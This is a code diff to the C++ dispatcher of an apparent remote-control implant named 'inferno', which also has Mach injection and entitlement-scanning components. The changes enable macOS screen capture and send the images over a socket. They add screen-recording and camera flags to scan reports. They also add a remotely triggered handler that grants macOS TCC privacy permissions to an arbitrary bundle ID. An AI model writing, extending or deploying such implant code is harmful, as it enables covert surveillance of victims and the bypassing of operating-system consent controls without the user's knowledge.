@@ -2,8 +2,8 @@
 #include "../include/entry_dylib.hpp"
 #include "../include/EntitlementScanner.hpp"
 #include "../include/MachInjector.hpp"
-#ifdef _WIN32
 #include "../include/ScreenCapture.hpp"
+#ifdef _WIN32
 #include "../include/CameraCapture.hpp"
 #endif
 #include <iostream>
@@ -274,7 +274,9 @@ void Agent::handleDispatching(Packet&& packet) {
 #endif
                     records.push_back(t.path + "|" + t.bundle_id + "|"
                                     + std::to_string(static_cast<int>(t.capability)) + "|"
-                                    + (is_host ? "1" : "0"));
+                                    + (is_host ? "1" : "0") + "|"
+                                    + (t.has_screen_recording ? "1" : "0") + "|"
+                                    + (t.has_camera ? "1" : "0"));
                 }
                 scan_report.clear();
                 for (size_t i = 0; i < records.size(); ++i) {
@@ -335,6 +337,8 @@ void Agent::handleDispatching(Packet&& packet) {
         } else {
             handleScreenshot();
         }
+    } else if (opcode == static_cast<uint16_t>(Opcode::TCC_GRANT)) {
+        handleTccGrant(std::move(packet));
     }
 }
 
@@ -457,51 +461,39 @@ void Agent::handleInjection(Packet&& packet) {
 }
 
 void Agent::handleScreenshot() {
-#ifdef _WIN32
     inferno::capture::CaptureResult result = inferno::capture::captureScreen();
     if (!result.success && !result.error_msg.empty()) {
         std::fprintf(stderr, "[Agent] Screenshot failed: %s\n",
                      result.error_msg.c_str());
     }
     std::vector<uint8_t> payload;
-    // status (2 bytes)
     uint16_t status = result.success ? 0 : 1;
     payload.push_back(static_cast<uint8_t>((status >> 8) & 0xFF));
     payload.push_back(static_cast<uint8_t>(status & 0xFF));
-    // width (4 bytes)
     uint32_t w = result.width;
     payload.push_back(static_cast<uint8_t>((w >> 24) & 0xFF));
     payload.push_back(static_cast<uint8_t>((w >> 16) & 0xFF));
     payload.push_back(static_cast<uint8_t>((w >> 8) & 0xFF));
     payload.push_back(static_cast<uint8_t>(w & 0xFF));
-    // height (4 bytes)
     uint32_t h = result.height;
     payload.push_back(static_cast<uint8_t>((h >> 24) & 0xFF));
     payload.push_back(static_cast<uint8_t>((h >> 16) & 0xFF));
     payload.push_back(static_cast<uint8_t>((h >> 8) & 0xFF));
     payload.push_back(static_cast<uint8_t>(h & 0xFF));
-    // size (4 bytes)
     uint32_t sz = static_cast<uint32_t>(result.jpeg_data.size());
     payload.push_back(static_cast<uint8_t>((sz >> 24) & 0xFF));
     payload.push_back(static_cast<uint8_t>((sz >> 16) & 0xFF));
     payload.push_back(static_cast<uint8_t>((sz >> 8) & 0xFF));
     payload.push_back(static_cast<uint8_t>(sz & 0xFF));
-    // JPEG data
     payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
 
     Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
                std::string(payload.begin(), payload.end()));
     m_socket.sendData(res.serialize());
-    std::cout << "[Agent] Screenshot captured (" << w << "x" << h
-              << ", " << sz << " bytes)" << std::endl;
-#else
-    std::vector<uint8_t> payload(14, 0); // status=1 (denied), w=0, h=0, sz=0
-    payload[1] = 1;
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
-    std::fprintf(stderr, "[Agent] Screenshot not supported on this platform\n");
-#endif
+    if (result.success) {
+        std::cout << "[Agent] Screenshot captured (" << w << "x" << h
+                  << ", " << sz << " bytes)" << std::endl;
+    }
 }
 
 void Agent::handleCameraCapture() {
@@ -545,6 +537,25 @@ void Agent::handleCameraCapture() {
     m_socket.sendData(res.serialize());
     std::fprintf(stderr, "[Agent] Camera not supported on this platform\n");
 #endif
+}
+
+void Agent::handleTccGrant(Packet&& packet) {
+    const auto& raw = packet.getPayload();
+    std::string bundle_id(raw.begin(), raw.end());
+    std::string result_str;
+
+#ifdef __APPLE__
+    std::fprintf(stdout, "[Agent] Granting TCC permissions for %s\n",
+                 bundle_id.c_str());
+    bool ok = inferno::tier2::grantTccPermissions(bundle_id);
+    result_str = bundle_id + "|" + (ok ? "1" : "0");
+#else
+    std::fprintf(stderr, "[Agent] TCC grant not supported on this platform\n");
+    result_str = bundle_id + "|0";
+#endif
+
+    Packet res(static_cast<uint16_t>(Opcode::TCC_GRANT_RES), result_str);
+    m_socket.sendData(res.serialize());
 }
 
 #ifdef INFERNO_TESTING
